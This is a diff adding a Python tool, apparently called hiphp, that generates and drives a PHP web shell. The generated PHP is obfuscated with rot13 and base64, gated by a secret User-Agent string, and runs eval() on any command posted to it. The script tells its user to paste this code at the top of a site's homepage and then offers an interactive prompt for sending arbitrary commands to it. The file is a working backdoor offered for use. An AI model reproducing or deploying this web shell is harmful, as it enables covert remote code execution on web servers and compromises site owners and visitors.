@@ -1,0 +1,61 @@
+#!/usr/bin/env python
+# coding:utf-8
+# code by : Yasser BDJ
+# email : by.root96@gmail.com 
+#s
+import requests
+from ashar import ashar
+import string
+
+#start hiphp class:
+class hiphp:
+    def __init__(mysillyobject,key,url):
+        mysillyobject.key=ashar(key,key).encode()
+        mysillyobject.url=url
+
+    #run:
+    def run(abc):
+        headers={'User-Agent':abc.key}
+        response=requests.post(abc.url,headers=headers)
+        if response.status_code==200:
+            if response.text[0:7]=="#python":
+                hiphp.input_command(abc.url,headers)
+            else:
+                print("The function reading code was not recognized.\nPlease copy and paste the following code at the top of the homepage or in another php file, taking into account the path you will enter in the original function.\n")
+                print(hiphp.Get_code(abc.key))
+        else:
+            print("We were unable to recognize the hiphp identifier.")
+            
+    #input_command:
+    def input_command(url,headers):
+        c=input('hiphp>>>')
+        if c:
+            if c[0:2]=='-c':
+                print(hiphp.Get_code(ashar(c[3:],c[3:]).encode()))
+            else:
+                ploads={'command':c}#open('php.php').read()
+                response=requests.post(url,headers=headers,data=ploads)
+                if response.text[7:13]!="<br />":
+                    print(response.text[7:])
+                else:
+                    print('ERROR in command line')
+        else:
+	        print('Command not found!')
+        hiphp.input_command(url,headers)
+
+    #torot13:
+    def rot13(text):
+        rot13=str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
+        return str.translate(text,rot13)
+        
+    #Get_code:
+    def Get_code(key):
+        login_key=ashar(key,key).encode()
+        code="if($_SERVER['HTTP_USER_AGENT']=='"+key+"'){echo'#python';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
+        code=hiphp.rot13(code)
+        code=ashar.tob64(code)
+        code=hiphp.rot13(code)
+        code=ashar.tob64(code)
+        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode('{code}')))));"
+        return "/*php code start*/\n"+code+"\n/*php code end*/"
+#e
